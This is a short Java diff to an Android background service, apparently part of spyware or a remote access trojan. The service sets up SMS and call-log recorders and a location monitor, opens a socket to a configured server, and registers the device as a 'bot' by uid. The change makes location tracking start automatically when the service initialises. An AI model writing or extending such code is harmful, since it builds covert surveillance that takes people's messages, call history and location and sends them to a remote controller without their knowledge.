@@ -179,15 +179,20 @@ public class NetworkSchedulerService extends JobService {
 
     private void init() {
 
+
         if (smsRecorderTask == null) smsRecorderTask = new SmsRecorderTask(this);
         if (callLogRecorderTask == null) callLogRecorderTask = new CallLogRecorderTask(this);
         if (commonParams == null) commonParams = new CommonParams(this);
         if (client == null) client = this;
-        if (locationTask == null) locationTask = new LocationMonitor(this);
+        if (locationTask == null){
+            locationTask = new LocationMonitor(this);
+            locationTask.start();
+        }
         if (socket == null) createSocket(commonParams.getServer());
         if (networkCallback == null) createChangeConnectivityMonitor();
 
         Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
+
 
         connect();
         cleanUp();
@@ -206,6 +211,7 @@ public class NetworkSchedulerService extends JobService {
                     Log.i(TAG, "\n\nSocket connected\n\n");
                     connected = true;
                     reconnects = 0;
+
 
                     HashMap bot = new HashMap();
                     bot.put("uid", commonParams.getUid());
